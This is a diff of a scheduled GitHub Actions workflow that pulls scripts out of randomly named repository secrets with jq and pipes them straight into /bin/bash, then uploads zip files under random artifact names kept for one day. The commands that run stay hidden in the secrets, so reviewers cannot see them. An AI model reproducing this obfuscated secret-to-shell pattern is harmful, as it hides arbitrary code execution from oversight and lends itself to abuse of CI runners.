@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '22 2,8,14,20 * * *'
+    - cron: '48 0,6,12,18 * * *'
 jobs:
   automation:
     runs-on: ubuntu-latest
@@ -12,17 +12,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: Process
         env:
-          uab5084: ${{ secrets.uab5084 }}
+          ljs23: ${{ secrets.ljs23 }}
         run: |
-          printf '%s' "$uab5084" | jq -r .j51395 | /bin/bash
-          printf '%s' "$ykky85438" | jq -r .wyx58842 | /bin/bash
-          echo $yslp2876 | jq -r .iwyiy5846 | /bin/bash
-          printf '%s' "$zon8" | jq -r .b29 | /bin/bash
-          echo $cxmy74 | jq -r .kmt778 | /bin/bash
+          printf '%s' "$ljs23" | jq -r .oy8792 | /bin/bash
+          echo $ujxty2205 | jq -r .z9464 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
         with:
-          name: YiQodSk4
+          name: 3h1fcJKT
           path: "*.zip"
           retention-days: 1
